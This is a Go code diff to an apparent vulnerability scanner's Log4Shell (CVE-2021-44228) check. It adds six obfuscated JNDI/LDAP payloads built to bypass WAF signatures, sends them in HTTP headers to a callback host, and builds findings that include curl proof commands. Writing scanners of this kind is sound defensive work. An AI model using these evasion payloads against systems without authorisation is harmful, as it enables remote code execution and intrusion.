@@ -88,6 +88,44 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 	return s.deepScan(ctx, client, targetURL, asset)
 }
 
+// obfuscatedPayloads returns JNDI payloads with WAF-bypass obfuscation.
+// Log4j's recursive lookup parser resolves nested ${...} expressions before
+// evaluating the outer expression, enabling bypass of signature-based WAFs.
+func obfuscatedPayloads(callbackHost string) []struct {
+	payload string
+	label   string
+} {
+	return []struct {
+		payload string
+		label   string
+	}{
+		{
+			payload: fmt.Sprintf("${jndi:ldap://%s/${hostName}}", callbackHost),
+			label:   "plain",
+		},
+		{
+			payload: fmt.Sprintf("${${lower:j}ndi:ldap://%s/${hostName}}", callbackHost),
+			label:   "lower-j",
+		},
+		{
+			payload: fmt.Sprintf("${${::-j}${::-n}${::-d}${::-i}:ldap://%s/${hostName}}", callbackHost),
+			label:   "char-split",
+		},
+		{
+			payload: fmt.Sprintf("${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://%s/${hostName}}", callbackHost),
+			label:   "full-lower",
+		},
+		{
+			payload: fmt.Sprintf("${${upper:j}ndi:ldap://%s/${hostName}}", callbackHost),
+			label:   "upper-j",
+		},
+		{
+			payload: fmt.Sprintf("${j${::-n}di:ldap://%s/${hostName}}", callbackHost),
+			label:   "partial-split",
+		},
+	}
+}
+
 // deepScan sends JNDI payloads in HTTP headers and checks for reflection.
 func (s *Scanner) deepScan(ctx context.Context, client *http.Client, targetURL, asset string) ([]finding.Finding, error) {
 	oobDomain := os.Getenv("BEACON_OOB_DOMAIN")
@@ -108,76 +146,83 @@ func (s *Scanner) deepScan(ctx context.Context, client *http.Client, targetURL, 
 		callbackHost = defaultOOBHost
 	}
 
-	payload := fmt.Sprintf("${jndi:ldap://%s/${hostName}}", callbackHost)
+	allPayloads := obfuscatedPayloads(callbackHost)
 
 	var findings []finding.Finding
 
 	for _, header := range injectHeaders {
-		req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
-		if err != nil {
-			continue
+		for _, p := range allPayloads {
+			req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
+			if err != nil {
+				continue
+			}
+			req.Header.Set(header, p.payload)
+
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+
+			body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
+			resp.Body.Close()
+
+			// Check whether the raw JNDI string is reflected in the response body.
+			// Without OOB detection we also require Java server signals — otherwise
+			// any debug endpoint that echoes headers would produce a false positive.
+			if !strings.Contains(string(body), reflectionMarker) {
+				continue
+			}
+			if !useOOB && !hasJavaSignals {
+				continue
+			}
+
+			desc := fmt.Sprintf(
+				"The application reflects the JNDI payload injected via the %q header back "+
+					"in the response body. This indicates the server echoes request headers "+
+					"(e.g. through a debug endpoint), and if Log4j processes those headers the "+
+					"server is vulnerable to CVE-2021-44228 Remote Code Execution. An attacker "+
+					"can exploit this to load and execute arbitrary Java classes from an "+
+					"attacker-controlled LDAP server.",
+				header)
+
+			if p.label != "plain" {
+				desc += fmt.Sprintf(" The %q obfuscation variant was used to bypass WAF signatures.", p.label)
+			}
+
+			ev := map[string]any{
+				"url":             targetURL,
+				"injected_header": header,
+				"payload":         p.payload,
+				"obfuscation":     p.label,
+				"reflection":      "jndi_string_in_body",
+			}
+
+			if useOOB {
+				ev["oob_domain"] = oobDomain
+				ev["oob_detection"] = true
+				desc += fmt.Sprintf(
+					" Out-of-band detection was used: the payload requested %s.", oobDomain)
+			}
+
+			findings = append(findings, finding.Finding{
+				CheckID:     finding.CheckCVELog4Shell,
+				Module:      "deep",
+				Scanner:     scannerName,
+				Severity:    finding.SeverityCritical,
+				Title:       fmt.Sprintf("Log4Shell (CVE-2021-44228): JNDI payload reflected via %s header (%s)", header, p.label),
+				Description: desc,
+				Asset:       asset,
+				DeepOnly:    true,
+				ProofCommand: fmt.Sprintf(
+					`curl -s -H '%s: %s' https://%s/ | grep -i 'jndi\|log4j'`,
+					header, p.payload, asset),
+				Evidence:     ev,
+				DiscoveredAt: time.Now(),
+			})
+
+			// One finding per asset is enough — stop all loops.
+			return findings, nil
 		}
-		req.Header.Set(header, payload)
-
-		resp, err := client.Do(req)
-		if err != nil {
-			continue
-		}
-
-		body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
-		resp.Body.Close()
-
-		// Check whether the raw JNDI string is reflected in the response body.
-		// Without OOB detection we also require Java server signals — otherwise
-		// any debug endpoint that echoes headers would produce a false positive.
-		if !strings.Contains(string(body), reflectionMarker) {
-			continue
-		}
-		if !useOOB && !hasJavaSignals {
-			continue
-		}
-
-		desc := fmt.Sprintf(
-			"The application reflects the JNDI payload injected via the %q header back "+
-				"in the response body. This indicates the server echoes request headers "+
-				"(e.g. through a debug endpoint), and if Log4j processes those headers the "+
-				"server is vulnerable to CVE-2021-44228 Remote Code Execution. An attacker "+
-				"can exploit this to load and execute arbitrary Java classes from an "+
-				"attacker-controlled LDAP server.",
-			header)
-
-		ev := map[string]any{
-			"url":             targetURL,
-			"injected_header": header,
-			"payload":         payload,
-			"reflection":      "jndi_string_in_body",
-		}
-
-		if useOOB {
-			ev["oob_domain"] = oobDomain
-			ev["oob_detection"] = true
-			desc += fmt.Sprintf(
-				" Out-of-band detection was used: the payload requested %s.", oobDomain)
-		}
-
-		findings = append(findings, finding.Finding{
-			CheckID:     finding.CheckCVELog4Shell,
-			Module:      "deep",
-			Scanner:     scannerName,
-			Severity:    finding.SeverityCritical,
-			Title:       fmt.Sprintf("Log4Shell (CVE-2021-44228): JNDI payload reflected via %s header", header),
-			Description: desc,
-			Asset:       asset,
-			DeepOnly:    true,
-			ProofCommand: fmt.Sprintf(
-				`curl -s -H 'X-Api-Version: ${jndi:ldap://beacon-canary.invalid/a}' https://%s/ | grep -i 'jndi\|log4j'`,
-				asset),
-			Evidence:     ev,
-			DiscoveredAt: time.Now(),
-		})
-
-		// One finding per asset is enough.
-		break
 	}
 
 	return findings, nil
